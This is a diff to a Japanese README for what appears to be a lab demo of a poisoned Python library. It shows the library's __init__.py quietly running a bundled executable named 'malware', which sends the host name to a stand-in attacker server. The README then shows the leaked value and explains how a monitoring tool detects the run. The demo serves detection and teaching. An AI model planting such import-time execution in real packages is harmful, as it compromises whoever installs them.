@@ -133,6 +133,46 @@ curl http://localhost:8081/stealer
 
 ### 5. マルウェアバイナリを実行する汚染ライブラリの混入による攻撃
 
+このデモ用Webアプリが導入しているライブラリmalware_packageでは`__init__.py`ファイルに不審な処理が記述されています。
+
+```python
+try:
+    import subprocess
+    import os
+
+    # Run malware
+    subprocess.Popen(
+        os.path.join(os.path.dirname(os.path.abspath(__file__)), "malware"),
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        stdin=subprocess.DEVNULL,
+    )
+except:
+    pass
+```
+
+ここではパッケージに同梱された実行可能ファイル`malware`を実行しています。
+
+ライブラリmalware_packageで提供されている機能を使う処理を実行します。
+
+以下のようなcurlコマンドの実行
+
 ```
 curl http://localhost:8081/malware
 ```
+
+もしくは <http://localhost:8081/malware> へブラウザでアクセスしてください。
+
+画面に `Malware demo is executed`と表示されます。
+
+このとき、デモ用Webアプリが導入しているライブラリmalware_package内の不審な処理が実行され、実行可能ファイル`malware`によってホスト名が攻撃者のサーバー`http://attacker/`に送信され流出しました。
+
+攻撃者の模擬サーバー <http://localhost:8082> を確認すると
+
+```
+[{'hostname': '2c2c289ce392'}]
+```
+
+とホスト名が攻撃者の手に渡っていることが確認できます。
+
+このようなマルウェアの実行では、Phrudeではsubprocessパッケージにより実行可能ファイルが実行されたことのみが検知できますが、システムコールによる検知ツールを使うことで実行可能ファイルがどのような処理をしたのかを把握することができます。
